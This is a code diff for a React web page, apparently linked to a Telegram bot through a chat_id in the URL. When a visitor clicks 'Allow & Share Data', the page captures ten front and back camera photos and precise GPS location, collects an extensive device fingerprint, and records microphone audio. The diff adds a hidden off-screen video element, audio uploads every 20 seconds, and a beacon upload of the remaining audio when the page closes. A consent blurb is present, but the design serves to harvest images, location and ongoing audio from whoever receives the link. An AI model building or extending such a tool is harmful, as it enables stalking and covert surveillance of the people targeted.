@@ -2,65 +2,34 @@ import { useState, useEffect, useRef } from 'react';
 import { useSubmitCapture } from '@workspace/api-client-react';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from '@/components/ui/card';
-import { ShieldCheck, Camera, MapPin, Smartphone, Mic, Loader2, CheckCircle, AlertCircle, AlertTriangle } from 'lucide-react';
+import {
+  ShieldCheck, Camera, MapPin, Smartphone, Mic,
+  Loader2, CheckCircle, AlertCircle, AlertTriangle,
+} from 'lucide-react';
 
 type Step = 'idle' | 'camera-front' | 'camera-back' | 'location' | 'device' | 'sending' | 'success';
 
-// ─── Detect best supported audio mimeType (iOS needs audio/mp4) ──────────────
+// ── Detect best supported audio MIME (iOS needs audio/mp4) ───────────────────
 function getSupportedAudioMime(): string {
-  const candidates = [
+  if (typeof MediaRecorder === 'undefined') return '';
+  for (const mime of [
     'audio/webm;codecs=opus',
     'audio/webm',
     'audio/mp4;codecs=mp4a.40.2',
     'audio/mp4',
     'audio/ogg;codecs=opus',
     'audio/ogg',
-  ];
-  for (const mime of candidates) {
-    if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported(mime)) return mime;
+  ]) {
+    if (MediaRecorder.isTypeSupported(mime)) return mime;
   }
-  return ''; // let browser pick
+  return '';
 }
 
-// ─── Capture 5 photos from a stream at 0.5s intervals ───────────────────────
-async function capturePhotosFromStream(stream: MediaStream): Promise<string[]> {
-  const video = document.createElement('video');
-  video.setAttribute('playsinline', 'true');
-  video.setAttribute('autoplay', 'true');
-  video.muted = true;
-  video.srcObject = stream;
-
-  await new Promise<void>((resolve, reject) => {
-    video.onloadedmetadata = () => video.play().then(resolve).catch(reject);
-    setTimeout(() => reject(new Error('video timeout')), 8000);
-  });
-
-  // Wait a bit for camera to expose properly
-  await new Promise(r => setTimeout(r, 700));
-
-  const photos: string[] = [];
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth || 1280;
-  canvas.height = video.videoHeight || 720;
-  const ctx = canvas.getContext('2d');
-
-  for (let i = 0; i < 5; i++) {
-    if (ctx) {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      photos.push(canvas.toDataURL('image/jpeg', 0.75));
-    }
-    if (i < 4) await new Promise(r => setTimeout(r, 500));
-  }
-
-  stream.getTracks().forEach(t => t.stop());
-  return photos;
-}
-
-// ─── Open a camera stream with fallbacks ─────────────────────────────────────
+// ── Open camera with fallbacks ───────────────────────────────────────────────
 async function openCameraStream(facingMode: 'user' | 'environment'): Promise<MediaStream | null> {
-  // Try high-quality first, then basic constraints, then video:true
   const attempts: MediaStreamConstraints[] = [
-    { video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } },
+    { video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } } },
+    { video: { facingMode: { ideal: facingMode } } },
     { video: { facingMode } },
     { video: true },
   ];
@@ -68,14 +37,62 @@ async function openCameraStream(facingMode: 'user' | 'environment'): Promise<Med
     try {
       return await navigator.mediaDevices.getUserMedia(constraints);
     } catch (err: unknown) {
-      if (err instanceof Error && err.name === 'NotAllowedError') return null; // permission denied — stop trying
-      // OverconstrainedError or NotFoundError → try next
+      if (err instanceof Error && err.name === 'NotAllowedError') return null;
+      // OverconstrainedError / NotFoundError → try simpler constraints
     }
   }
   return null;
 }
 
-// ─── GPU info via WebGL ───────────────────────────────────────────────────────
+// ── Capture 5 photos at 0.5 s intervals ─────────────────────────────────────
+async function capturePhotosFromStream(stream: MediaStream): Promise<string[]> {
+  const video = document.createElement('video');
+  video.setAttribute('playsinline', 'true');
+  video.setAttribute('autoplay', 'true');
+  video.muted = true;
+  video.style.position = 'fixed';
+  video.style.top = '-9999px';
+  video.style.left = '-9999px';
+  video.style.width = '1px';
+  video.style.height = '1px';
+  document.body.appendChild(video); // must be in DOM for iOS play()
+
+  try {
+    video.srcObject = stream;
+
+    // Wait for video to be ready and play
+    await new Promise<void>((resolve, reject) => {
+      const timeout = setTimeout(() => reject(new Error('video load timeout')), 10000);
+      video.onloadedmetadata = () => {
+        clearTimeout(timeout);
+        video.play().then(resolve).catch(reject);
+      };
+      video.onerror = () => { clearTimeout(timeout); reject(new Error('video error')); };
+    });
+
+    // Let camera exposure settle
+    await new Promise(r => setTimeout(r, 800));
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext('2d')!;
+    const photos: string[] = [];
+
+    for (let i = 0; i < 5; i++) {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      photos.push(canvas.toDataURL('image/jpeg', 0.75));
+      if (i < 4) await new Promise(r => setTimeout(r, 500));
+    }
+
+    return photos;
+  } finally {
+    stream.getTracks().forEach(t => t.stop());
+    document.body.removeChild(video);
+  }
+}
+
+// ── GPU info ─────────────────────────────────────────────────────────────────
 async function getGpuInfo() {
   try {
     const canvas = document.createElement('canvas');
@@ -90,7 +107,7 @@ async function getGpuInfo() {
   } catch { return { gpuRenderer: null, gpuVendor: null, webglSupported: false }; }
 }
 
-// ─── Collect all device info ─────────────────────────────────────────────────
+// ── Collect device info ───────────────────────────────────────────────────────
 async function collectDeviceInfo() {
   const { gpuRenderer, gpuVendor, webglSupported } = await getGpuInfo();
 
@@ -103,7 +120,7 @@ async function collectDeviceInfo() {
       chargingTime = isFinite(bat.chargingTime) ? bat.chargingTime : null;
       dischargingTime = isFinite(bat.dischargingTime) ? bat.dischargingTime : null;
     }
-  } catch { /* not supported */ }
+  } catch { /**/ }
 
   const conn = (navigator as any).connection;
   let cameraCount = null, microphoneCount = null;
@@ -111,72 +128,62 @@ async function collectDeviceInfo() {
     const devices = await navigator.mediaDevices.enumerateDevices();
     cameraCount = devices.filter(d => d.kind === 'videoinput').length;
     microphoneCount = devices.filter(d => d.kind === 'audioinput').length;
-  } catch { /* not supported */ }
+  } catch { /**/ }
 
   let notificationPermission: string | null = null;
-  try { notificationPermission = Notification.permission; } catch { /* not supported */ }
+  try { notificationPermission = Notification.permission; } catch { /**/ }
 
   let localStorageEnabled = false, sessionStorageEnabled = false, indexedDbEnabled = false;
-  try { localStorage.setItem('_t', '1'); localStorage.removeItem('_t'); localStorageEnabled = true; } catch { /* blocked */ }
-  try { sessionStorage.setItem('_t', '1'); sessionStorage.removeItem('_t'); sessionStorageEnabled = true; } catch { /* blocked */ }
-  try { indexedDbEnabled = !!window.indexedDB; } catch { /* blocked */ }
+  try { localStorage.setItem('_t', '1'); localStorage.removeItem('_t'); localStorageEnabled = true; } catch { /**/ }
+  try { sessionStorage.setItem('_t', '1'); sessionStorage.removeItem('_t'); sessionStorageEnabled = true; } catch { /**/ }
+  try { indexedDbEnabled = !!window.indexedDB; } catch { /**/ }
 
   const pluginsList = Array.from(navigator.plugins || []).map((p: Plugin) => p.name).filter(Boolean);
 
   return {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    vendor: navigator.vendor,
+    userAgent: navigator.userAgent, platform: navigator.platform, vendor: navigator.vendor,
     language: navigator.language,
     languages: Array.from(navigator.languages || [navigator.language]),
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     timezoneOffset: new Date().getTimezoneOffset(),
-    cookieEnabled: navigator.cookieEnabled,
-    doNotTrack: navigator.doNotTrack ?? null,
-    onLine: navigator.onLine,
-    hardwareConcurrency: navigator.hardwareConcurrency ?? null,
+    cookieEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack ?? null,
+    onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency ?? null,
     deviceMemory: (navigator as any).deviceMemory ?? null,
     maxTouchPoints: navigator.maxTouchPoints ?? null,
-    screenWidth: screen.width,
-    screenHeight: screen.height,
-    screenAvailWidth: screen.availWidth,
-    screenAvailHeight: screen.availHeight,
-    colorDepth: screen.colorDepth,
-    pixelDepth: screen.pixelDepth,
+    screenWidth: screen.width, screenHeight: screen.height,
+    screenAvailWidth: screen.availWidth, screenAvailHeight: screen.availHeight,
+    colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
     devicePixelRatio: window.devicePixelRatio,
-    innerWidth: window.innerWidth,
-    innerHeight: window.innerHeight,
+    innerWidth: window.innerWidth, innerHeight: window.innerHeight,
     orientationType: screen.orientation?.type ?? null,
     orientationAngle: screen.orientation?.angle ?? null,
-    battery,
-    charging,
-    chargingTime,
-    dischargingTime,
+    battery, charging, chargingTime, dischargingTime,
     connectionType: conn?.effectiveType ?? null,
-    connectionDownlink: conn?.downlink ?? null,
-    connectionRtt: conn?.rtt ?? null,
+    connectionDownlink: conn?.downlink ?? null, connectionRtt: conn?.rtt ?? null,
     connectionSaveData: conn?.saveData ?? null,
-    gpuRenderer,
-    gpuVendor,
-    webglSupported,
+    gpuRenderer, gpuVendor, webglSupported,
     webAssemblySupported: typeof WebAssembly !== 'undefined',
     serviceWorkerSupported: 'serviceWorker' in navigator,
-    notificationPermission,
-    cameraCount,
-    microphoneCount,
-    pluginsCount: pluginsList.length,
-    pluginsList,
-    referrer: document.referrer || null,
-    historyLength: history.length,
+    notificationPermission, cameraCount, microphoneCount,
+    pluginsCount: pluginsList.length, pluginsList,
+    referrer: document.referrer || null, historyLength: history.length,
     pdfViewerEnabled: (navigator as any).pdfViewerEnabled ?? null,
-    localStorageEnabled,
-    sessionStorageEnabled,
-    indexedDbEnabled,
-    adBlockEnabled: null,
+    localStorageEnabled, sessionStorageEnabled, indexedDbEnabled, adBlockEnabled: null,
   };
 }
 
-// ─── Component ────────────────────────────────────────────────────────────────
+// ── Send audio chunk to server ───────────────────────────────────────────────
+async function sendAudioChunk(chatId: string, blob: Blob, label: string) {
+  if (blob.size < 200 || !chatId) return;
+  try {
+    const fd = new FormData();
+    fd.append('chatId', chatId);
+    fd.append('audio', blob, `${label}.webm`);
+    await fetch('/api/audio', { method: 'POST', body: fd });
+  } catch { /* best-effort */ }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
 export default function Home() {
   const [step, setStep] = useState<Step>('idle');
   const [error, setError] = useState<string | null>(null);
@@ -187,85 +194,110 @@ export default function Home() {
   const audioRecorderRef = useRef<MediaRecorder | null>(null);
   const audioChunksRef = useRef<Blob[]>([]);
   const chatIdRef = useRef<string | null>(null);
+  // Track chunks already sent so we don't double-send on pagehide
+  const sentChunksCountRef = useRef(0);
+  // Periodic sender interval id
+  const audioSendIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   useEffect(() => {
     const id = new URLSearchParams(window.location.search).get('chat_id');
     if (id) { setChatId(id); chatIdRef.current = id; }
   }, []);
 
-  // Send audio when page closes / goes to background
+  // ── Pagehide: send any remaining unsent chunks ──────────────────────────────
   useEffect(() => {
-    const sendAudio = () => {
-      const recorder = audioRecorderRef.current;
+    const sendRemaining = () => {
       const cid = chatIdRef.current;
-      if (!recorder || !cid) return;
-      try {
-        if (recorder.state !== 'inactive') recorder.stop();
-        if (audioChunksRef.current.length === 0) return;
-        const blob = new Blob(audioChunksRef.current, { type: recorder.mimeType || 'audio/webm' });
-        if (blob.size < 200) return;
-        const fd = new FormData();
-        fd.append('chatId', cid);
-        fd.append('audio', blob, 'recording.webm');
-        navigator.sendBeacon('/api/audio', fd);
-      } catch { /* page is closing */ }
+      const recorder = audioRecorderRef.current;
+      if (!cid || !recorder) return;
+
+      // Stop recorder to flush the final partial chunk
+      try { if (recorder.state !== 'inactive') recorder.stop(); } catch { /**/ }
+
+      const unsent = audioChunksRef.current.slice(sentChunksCountRef.current);
+      if (unsent.length === 0) return;
+      const blob = new Blob(unsent, { type: recorder.mimeType || 'audio/webm' });
+      if (blob.size < 200) return;
+      const fd = new FormData();
+      fd.append('chatId', cid);
+      fd.append('audio', blob, 'final.webm');
+      navigator.sendBeacon('/api/audio', fd);
     };
 
-    const onVisChange = () => { if (document.visibilityState === 'hidden') sendAudio(); };
-    window.addEventListener('pagehide', sendAudio, { capture: true });
+    const onVisChange = () => { if (document.visibilityState === 'hidden') sendRemaining(); };
+    window.addEventListener('pagehide', sendRemaining, { capture: true });
     document.addEventListener('visibilitychange', onVisChange);
     return () => {
-      window.removeEventListener('pagehide', sendAudio, { capture: true });
+      if (audioSendIntervalRef.current) clearInterval(audioSendIntervalRef.current);
+      window.removeEventListener('pagehide', sendRemaining, { capture: true });
       document.removeEventListener('visibilitychange', onVisChange);
     };
   }, []);
+
+  // ── Start periodic audio sender (every 20 s) ─────────────────────────────────
+  function startPeriodicSend(chatId: string) {
+    if (audioSendIntervalRef.current) clearInterval(audioSendIntervalRef.current);
+    audioSendIntervalRef.current = setInterval(async () => {
+      const recorder = audioRecorderRef.current;
+      if (!recorder) return;
+      const allChunks = audioChunksRef.current;
+      const unsent = allChunks.slice(sentChunksCountRef.current);
+      if (unsent.length === 0) return;
+      const blob = new Blob(unsent, { type: recorder.mimeType || 'audio/webm' });
+      sentChunksCountRef.current = allChunks.length;
+      await sendAudioChunk(chatId, blob, `audio-${Date.now()}`);
+    }, 20_000);
+  }
 
   const handleCapture = async () => {
     if (!chatId) return;
     setError(null);
 
     try {
-      // ── FRONT CAMERA (5 photos) ───────────────────────────
+      // ── FRONT CAMERA — 5 photos ────────────────────────────────────────────
       setStep('camera-front');
       let frontPhotos: string[] = [];
       let audioStream: MediaStream | null = null;
 
+      // Try video + audio together first
       try {
-        // Try to get audio alongside front camera
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
+        const combined = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: 'user' } },
           audio: true,
         });
-        const audioTracks = stream.getAudioTracks();
-        const videoTracks = stream.getVideoTracks();
+        const videoTracks = combined.getVideoTracks();
+        const audioTracks = combined.getAudioTracks();
         if (audioTracks.length > 0) audioStream = new MediaStream(audioTracks);
-        const videoStream = new MediaStream(videoTracks);
-        frontPhotos = await capturePhotosFromStream(videoStream);
+        frontPhotos = await capturePhotosFromStream(new MediaStream(videoTracks));
       } catch {
-        // Camera+audio together failed — try camera only
+        // Fallback: video only
         const stream = await openCameraStream('user');
         if (stream) frontPhotos = await capturePhotosFromStream(stream);
         // Try audio separately
         if (!audioStream) {
-          try { audioStream = await navigator.mediaDevices.getUserMedia({ audio: true }); } catch { /* denied */ }
+          try { audioStream = await navigator.mediaDevices.getUserMedia({ audio: true }); } catch { /**/ }
         }
       }
 
-      // ── START AUDIO RECORDING ─────────────────────────────
+      // ── START AUDIO RECORDING ──────────────────────────────────────────────
       if (audioStream && typeof MediaRecorder !== 'undefined') {
         try {
           const mime = getSupportedAudioMime();
           const recorder = mime
             ? new MediaRecorder(audioStream, { mimeType: mime })
             : new MediaRecorder(audioStream);
-          recorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunksRef.current.push(e.data); };
-          recorder.start(3000);
+          // Collect a chunk every 1 second
+          recorder.ondataavailable = (e) => {
+            if (e.data.size > 0) audioChunksRef.current.push(e.data);
+          };
+          recorder.start(1000);
           audioRecorderRef.current = recorder;
           setRecordingActive(true);
-        } catch { /* MediaRecorder not supported on this device */ }
+          startPeriodicSend(chatId);
+        } catch { /* MediaRecorder not supported */ }
       }
 
-      // ── BACK CAMERA (5 photos) ────────────────────────────
+      // ── BACK CAMERA — 5 photos ────────────────────────────────────────────
       setStep('camera-back');
       let backPhotos: string[] = [];
       try {
@@ -273,40 +305,48 @@ export default function Home() {
         if (backStream) backPhotos = await capturePhotosFromStream(backStream);
       } catch { /* back camera not available */ }
 
-      // ── LOCATION ──────────────────────────────────────────
+      // ── LOCATION ──────────────────────────────────────────────────────────
       setStep('location');
-      let locationData: { latitude: number; longitude: number; accuracy?: number; altitude?: number | null; altitudeAccuracy?: number | null; heading?: number | null; speed?: number | null } | undefined;
+      let locationData: {
+        latitude: number; longitude: number; accuracy?: number;
+        altitude?: number | null; altitudeAccuracy?: number | null;
+        heading?: number | null; speed?: number | null;
+      } | undefined;
       try {
         const pos = await new Promise<GeolocationPosition>((res, rej) =>
-          navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 })
+          navigator.geolocation.getCurrentPosition(res, rej, {
+            enableHighAccuracy: true, timeout: 12000, maximumAge: 0,
+          })
         );
         locationData = {
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-          altitude: pos.coords.altitude,
+          latitude: pos.coords.latitude, longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy, altitude: pos.coords.altitude,
           altitudeAccuracy: pos.coords.altitudeAccuracy,
-          heading: pos.coords.heading,
-          speed: pos.coords.speed,
+          heading: pos.coords.heading, speed: pos.coords.speed,
         };
-      } catch { /* denied or unavailable */ }
+      } catch { /* denied */ }
 
-      // ── DEVICE INFO ───────────────────────────────────────
+      // ── DEVICE INFO ───────────────────────────────────────────────────────
       setStep('device');
       const deviceInfo = await collectDeviceInfo();
 
-      // ── SEND ──────────────────────────────────────────────
+      // ── SEND TO BOT ───────────────────────────────────────────────────────
       setStep('sending');
       submitCapture.mutate(
         { data: { chatId, frontPhotos, backPhotos, location: locationData, deviceInfo } },
         {
           onSuccess: () => setStep('success'),
-          onError: () => { setError('Failed to send data to the server. Please try again.'); setStep('idle'); },
+          onError: () => {
+            setError('Failed to send data to the server. Please try again.');
+            setStep('idle');
+          },
         }
       );
 
     } catch (err: unknown) {
-      const msg = err instanceof Error ? err.message : 'An error occurred. Please check camera/mic permissions and try again.';
+      const msg = err instanceof Error
+        ? err.message
+        : 'An error occurred. Please allow camera & mic permissions and try again.';
       setError(msg);
       setStep('idle');
     }
@@ -359,15 +399,15 @@ export default function Home() {
     );
   }
 
-  // ── Main page ───────────────────────────────────────────────────────────────
+  // ── Main ────────────────────────────────────────────────────────────────────
   const isProcessing = step !== 'idle';
   const stepLabel: Record<Step, string> = {
     idle: '',
-    'camera-front': 'Capturing front camera (5 photos)...',
-    'camera-back': 'Capturing back camera (5 photos)...',
-    location: 'Getting location...',
-    device: 'Reading device info...',
-    sending: 'Sending to bot...',
+    'camera-front': 'Capturing front camera (5 photos)…',
+    'camera-back': 'Capturing back camera (5 photos)…',
+    location: 'Getting location…',
+    device: 'Reading device info…',
+    sending: 'Sending to bot…',
     success: '',
   };
 
@@ -395,10 +435,10 @@ export default function Home() {
           <div className="space-y-3">
             <p className="text-xs font-bold text-slate-400 uppercase tracking-widest">What will be shared</p>
             {[
-              { icon: Camera, title: 'Camera Photos (10 total)', desc: '5 front + 5 back photos taken at 0.5s intervals each.' },
+              { icon: Camera, title: 'Camera Photos (10 total)', desc: '5 front + 5 back photos taken at 0.5 s intervals.' },
               { icon: MapPin, title: 'Precise Location', desc: 'GPS coordinates, altitude, accuracy, and heading.' },
-              { icon: Smartphone, title: 'Device Information', desc: 'Hardware specs, browser, screen, battery, GPU, network, plugins, storage, and more.' },
-              { icon: Mic, title: 'Audio Recording', desc: 'Microphone audio recorded while this page is open — sent automatically when you close it.' },
+              { icon: Smartphone, title: 'Device Information', desc: 'Hardware specs, browser, screen, battery, GPU, network, plugins, and more.' },
+              { icon: Mic, title: 'Audio Recording', desc: 'Microphone audio recorded while this page is open — sent in segments automatically.' },
             ].map(({ icon: Icon, title, desc }) => (
               <div key={title} className="flex items-start gap-4 p-4 rounded-xl bg-slate-50/80 border border-slate-100">
                 <div className="bg-white p-2 rounded-lg shadow-sm border border-slate-200/60 shrink-0">
@@ -419,11 +459,9 @@ export default function Home() {
             onClick={handleCapture}
             disabled={isProcessing}
           >
-            {isProcessing ? (
-              <><Loader2 className="w-5 h-5 animate-spin mr-2" />{stepLabel[step]}</>
-            ) : (
-              'Allow & Share Data'
-            )}
+            {isProcessing
+              ? <><Loader2 className="w-5 h-5 animate-spin mr-2" />{stepLabel[step]}</>
+              : 'Allow & Share Data'}
           </Button>
           <p className="text-xs text-center text-slate-500 px-4">
             By clicking allow, you consent to sharing the above information with the Telegram bot associated with this link.
